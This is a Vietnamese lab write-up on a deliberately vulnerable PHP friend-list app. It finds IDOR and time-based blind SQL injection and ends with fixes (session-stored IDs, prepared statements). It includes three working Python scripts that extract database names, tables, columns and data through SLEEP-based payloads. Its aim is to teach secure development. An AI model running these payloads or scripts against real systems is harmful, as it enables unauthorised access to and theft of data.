# Lab 1

Đây là 1 bài lab từ người bạn của mình trong quá trình học và có những lỗ hổng bảo mật.

Lab đầu tiên này là white-box.

Mục đích của write up này là để nâng cao ý thức bảo mật trong lúc phát triển các sản phẩm dù đang đi học.

# Chuẩn bị

Đây là các bước chuẩn bị để chạy bài lab này:

1. Copy source code về `C:\xampp\htdocs\sql-injection-lab\` (mình để trong folder `sql-injection-lab`, có thể để trong folder nhưng bắt buộc phải ở trong folder con của `htdocs`)
2. Sử dụng Xampp để khởi tạo server chạy ở localhost. (Apache và MySQL)
3. Vào file `functions/settings.php` để sửa đổi thông tin của database

![Mình sử dụng schema db tên `test`](images/image.png)

Mình sử dụng schema db tên `test`

1. Lần đầu chạy ứng dụng này trên xampp nên vào trang `index.php` trên browser để tự động khởi tạo table và các dữ liệu khác

# Mô tả ứng dụng

Ứng dụng này cho phép các người dùng đăng ký, đăng nhập, kết bạn, xoá bạn.

# Recon

Link mind map: [https://xmind.app/embed/BYbHgm](https://xmind.app/embed/BYbHgm)

Tổng cộng có 7 file chính:

1. `about.php` : Chủ yếu chứa các đoạn code `HTML/CSS`
2. `logout.php`: Xoá session và cookie
3. `index.php`: Khởi tạo database, table, populate dữ liệu
4. `signup.php`: Đăng ký
5. `login.php`: Đăng nhập
6. `friendadd.php`: Thêm bạn bè và coi tất cả các bạn khác
7. `friendlist.php`: Coi bạn bè hiện tại và huỷ kết bạn

3 file đầu tiên lại không tiếp nhận bất kì dữ liệu không tin cậy đến từ người dùng. Nên cùng phân tích 4 file cuối.

## Phân tích code và request burpsuite

Đối với trang `signup.php`:

![Tất cả field đều bị “sanitize”](images/image%201.png)

Tất cả field đều bị “sanitize”

Tất cả 4 field tiếp nhận thông tin từ phía người dùng đều phải đi qua hàm `sanitize` nên không thể bị exploit SQLi, XSS.

Trang `login.php` chỉ tiếp nhận 2 field dữ liệu được nhập từ người dùng nhưng đều phải trải qua hàm `sanitize`

![Dữ liệu nhập từ người dùng bị `sanitize`](images/image%202.png)

Dữ liệu nhập từ người dùng bị `sanitize`

Với phương thức `GET` ở trang `friendadd.php` , ta có chức năng hiển thị bạn bè chưa được kết. Ở đây có 1 param là `page`

![images/image.png](images/image%203.png)

Nhưng khi kiểm tra liệu `page` có thể bị exploit bởi SQLi không, thì phát hiện ra rằng biến `page` này chỉ nhận số để trải qua các phương thức tính toán rồi mới đi vào câu truy vấn database:

![Dòng 77-87 trong file `friendadd.php`](images/image%204.png)

Dòng 77-87 trong file `friendadd.php`

Sử dụng Xdebug cho PHP để quan sát kĩ hơn khi gửi `?page='` , đặt breakpoint ở dòng 77 file `friendadd.php`:

![Với payload `'` thì `$current_page = 0`](images/image%205.png)

Với payload `'` thì `$current_page = 0`

Với payload `'` nhưng biến `$current_page` chỉ nhận được payload dạng số nên không khả thi exploit SQLi ở đây.

Tiếp tục quan sát trang này khi kết bạn với người khác. Phát hiện ra rằng khi kết bạn sử dụng phương thức `POST` kèm 2 dữ liệu không tin cậy từ người dùng là `friend_id` và `friend_id2`:

![images/image.png](images/image%206.png)

Kiểm tra liệu thật sự 2 biến này có phải là dữ liệu không tin cậy đến từ người dùng không dựa vào mã nguồn:

![Dòng 134 - 154 của file `friendadd.php`](images/image%207.png)

Dòng 134 - 154 của file `friendadd.php`

2 biến này thực sự không qua lớp filter nào và được đưa thẳng vào câu truy vấn cơ sở dữ liệu.

Nhưng do cấu trúc code ở chỗ này khi kết bạn lại không hề hiển thị kết quả truy vấn từ cơ sở dữ liệu mà chỉ hiển thị liệu có thành công hay chưa ⇒ Sử dụng Time Based Blind SQLi để test

![images/image.png](images/image%208.png)

Ứng dụng trả kết quả về hơn 10 giây ⇒ Time based Blind SQLi exploit

Không chỉ thế, biến `friend_id` ở đây có thể dẫn tới bug IDOR.

Tạo 1 người dùng mới `pandora@gmail.com:pandora`, người dùng này có id là `22`

Thay đổi friend_id từ `21` sang `22` và gửi sử dụng burp:

![Cookie của người dùng `21`](images/image%209.png)

Cookie của người dùng `21`

Tiếp theo đăng nhập bằng tài khoản của người dùng có id `22` và kiểm tra liệu có người bạn nào không:

![images/image.png](images/image%2010.png)

Đã có 1 người bạn có id là `20` ⇒ Chứng minh bị bug IDOR

Cuối cùng là trang `friendlist.php` với phương thức `POST` nhận 2 input không tin cậy từ người dùng nhưng lại khá dị ở chỗ là mặc dù `friend_id` được gửi về nhưng ở phía server lại không nhận mà lại lấy từ `$_SESSION['friend_id']`:

![2 untrusted data nhận từ người dùng](images/image%2011.png)

2 untrusted data nhận từ người dùng

![Dòng 85 - 103 của file `friendlist.php`](images/image%2012.png)

Dòng 85 - 103 của file `friendlist.php`

Nhưng với câu query đầu tiên do đó là câu lệnh `DELETE` và trong trường hợp này yêu cầu payload exploit cần dấu `'` nên ta sẽ tập trung vào câu query thứ 2 ở dòng 91.

Thử nghiệm giả thuyết liệu có bị SQLi không:

![Bị SQLi với payload `1 AND SLEEP(20);#`](images/image%2013.png)

Bị SQLi với payload `1 AND SLEEP(20);#`

# Exploit

Đầu tiên cần brute force bằng cách sử dụng Time based Blind SQLi để lấy tên của database, tên các bảng:

```python
import requests
import string
import time
import sys
url = "http://localhost/sql-injection-lab/1/friendadd.php"
cookies = {"PHPSESSID": "47jhemumu2hib038cmlrnp3gml"}
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://localhost/sql-injection-lab/1/friendadd.php"
}
# Ký tự brute-force
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_" + "{}!@#$%^&*()_+-=[]|;:,.<>?/'\""
# Thời gian phản hồi để xác định payload đúng
TIME_THRESHOLD = 20
# Hàm brute-force ký tự SQL
def brute_force_sql(query_template, description):
    extracted_value = ""
    index = 1
    while True:
        found = False
        for char in char_set:
            payload = f"1' AND IF(SUBSTRING(({query_template}),{index},1)='{char}', SLEEP(20), 0) -- "
            data = {"friend_id": "21", "friend_id2": payload, "add_submit": "Addfriend"}
            start_time = time.time()
            response = requests.post(url, data=data, headers=headers, cookies=cookies)
            elapsed_time = time.time() - start_time
            if elapsed_time > TIME_THRESHOLD:
                extracted_value += char
                sys.stdout.write(f"\r[+] Extracting {description}: {extracted_value}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
        index += 1
    print()
    return extracted_value
# 1️⃣ Extract Database Name
database_name = brute_force_sql("SELECT database()", "Database Name")
# 2️⃣ Extract All Table Names
table_names = []
table_index = 0
while True:
    table_name = brute_force_sql(
        f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT 1 OFFSET {table_index}",
        f"Table Name {table_index + 1}"
    )
    if table_name == "":
        break
    table_names.append(table_name)
    table_index += 1
with open("tables.txt", "w") as f:
    for table in table_names:
        f.write(table + "\n")
print("\n📋 List of Tables:")
for i, table in enumerate(table_names, 1):
    print(f"  {i}. {table}")
print("\n✅ Danh sách bảng đã được lưu vào file 'tables.txt'")
```

Có thể tăng thời gian sleep để có kết quả càng chính xác hơn.

Kết quả từ script `table_exploit.py`:

![images/image.png](images/image%2014.png)

⇒ Thu được về tên database là `test` và tổng có 9 table.

Bảng `flag` là bảng đã được setup từ trước để giấu flag.

Script python để đọc cột và lấy flag:

```python
import requests
import string
import time
import sys

url = "http://localhost/sql-injection-lab/1/friendadd.php"
cookies = {"PHPSESSID": "47jhemumu2hib038cmlrnp3gml"}
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://localhost/sql-injection-lab/1/friendadd.php"
}
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_" + "{}!@#$%^&*()_+-=[]|;:,.<>?/'\""
TIME_THRESHOLD = 20
def brute_force_sql(query_template, description):
    extracted_value = ""
    index = 1
    while True:
        found = False
        for char in char_set:
            payload = f"1' AND IF(SUBSTRING(({query_template}),{index},1)='{char}', SLEEP(20), 0) -- "
            data = {"friend_id": "21", "friend_id2": payload, "add_submit": "Addfriend"}
            start_time = time.time()
            response = requests.post(url, data=data, headers=headers, cookies=cookies)
            elapsed_time = time.time() - start_time
            if elapsed_time > TIME_THRESHOLD:
                extracted_value += char
                sys.stdout.write(f"\r[+] Extracting {description}: {extracted_value}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
        index += 1
    print()
    return extracted_value
# 1️⃣ Nhập tên bảng cần brute-force
table_name = input("Nhập tên bảng cần brute-force cột và dữ liệu: ")
# 2️⃣ Brute-force tên các cột trong bảng
column_names = []
column_index = 0
while True:
    column_name = brute_force_sql(
        f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {column_index}",
        f"Column Name {column_index + 1}"
    )
    if column_name == "":
        break
    column_names.append(column_name)
    column_index += 1
# Lưu danh sách cột vào file
with open(f"{table_name}_columns.txt", "w") as f:
    for col in column_names:
        f.write(col + "\n")
print("\n📋 List of Columns:")
for i, col in enumerate(column_names, 1):
    print(f"  {i}. {col}")
print(f"\n✅ Danh sách cột đã được lưu vào file '{table_name}_columns.txt'")
# 3️⃣ Brute-force dữ liệu trong từng cột
for column in column_names:
    print(f"\n🔍 Extracting data from column: {column}")
    extracted_data = []
    row_index = 0
    while True:
        row_value = brute_force_sql(
            f"SELECT {column} FROM {table_name} LIMIT 1 OFFSET {row_index}",
            f"{column} - Row {row_index + 1}"
        )
        if row_value == "":
            break
        extracted_data.append(row_value)
        row_index += 1
    # Lưu dữ liệu vào file
    with open(f"{table_name}_{column}.txt", "w") as f:
        for row in extracted_data:
            f.write(row + "\n")
    print(f"✅ Dữ liệu từ cột '{column}' đã được lưu vào '{table_name}_{column}.txt'")
```

Kết quả thu được: bảng `flag` có 1 cột tên `secret`, trong cột `secret` có flag `flag{this_is_flag}`:

![images/image.png](images/image%2015.png)

Đối với trang `friendlist.php`:

Ta sẽ tập trung exploit câu query thứ 2 nên payload sẽ không nên có dấu `'` nếu không sẽ trigger lỗi ở câu query thứ 1.

![Dòng 85 - 92 của file `friendlist.php`](images/image%2016.png)

Dòng 85 - 92 của file `friendlist.php`

Script để exploit lấy tên database và tất cả table:

```python
import requests
import string
import time
import sys
url = "http://localhost/sql-injection-lab/1/friendlist.php"
cookies = {"PHPSESSID": "47jhemumu2hib038cmlrnp3gml"}
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
}

def extract_database_name():
    db_name = ""
    print("[+] Extracting Database Name:", end="", flush=True)
    for i in range(1, 10):  # Assuming max length of DB name is 50
        found = False
        for char in string.printable:
            ascii_val = ord(char)
            payload = f"1 AND ASCII(SUBSTRING(DATABASE(),{i},1))={ascii_val} AND SLEEP(30) --"
            data = {"friend_id": "21", "friend_id2": payload, "delete_submit": "Unfriend"}
            start_time = time.time()
            response = requests.post(url, headers=headers, data=data, cookies=cookies)
            elapsed_time = time.time() - start_time
            if elapsed_time > 30:  # If delay detected
                db_name += char
                print(char, end="", flush=True)
                found = True
                break
        if not found:
            print("\n[+] Database Name Extraction Complete!")
            break
    return db_name
def extract_table_names():
    table_names = []
    print("\n[+] Extracting Table Names:")
    for table_index in range(10):  # Assuming max 10 tables
        table_name = ""
        print(f"[+] Extracting Table {table_index + 1}: ", end="", flush=True)
        for char_index in range(1, 15):  # Assuming max length of table name is 50
            found = False
            for char in string.printable:
                ascii_val = ord(char)
                payload = f"1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {table_index},1),{char_index},1))={ascii_val} AND SLEEP(30) --"
                data = {"friend_id": "21", "friend_id2": payload, "delete_submit": "Unfriend"}
                start_time = time.time()
                response = requests.post(url, headers=headers, data=data, cookies=cookies)
                elapsed_time = time.time() - start_time
                if elapsed_time > 30:
                    table_name += char
                    print(char, end="", flush=True)
                    found = True
                    break
            if not found:
                break
        if table_name:
            table_names.append(table_name)
            print()  # Move to new line for next table
        else:
            break
    print("[+] Table Names Extraction Complete!")
    return table_names
if __name__ == "__main__":
    print("Starting Database Name Extraction...")
    db_name = extract_database_name()
    print(f"\nDatabase Name: {db_name}")
    print("\nStarting Table Names Extraction...")
    table_names = extract_table_names()
    print(f"\nExtracted Tables: {table_names}")
```

# Solution

1. Các lỗi về IDOR thì có thể sử dụng biến `$_SESSION['friend_id']` đã được lưu ở server thay vì nhận `$_POST["friend_id"]`
2. Các câu lệnh SQL thì nên sử dụng prepared statement để ngăn chặn SQLi
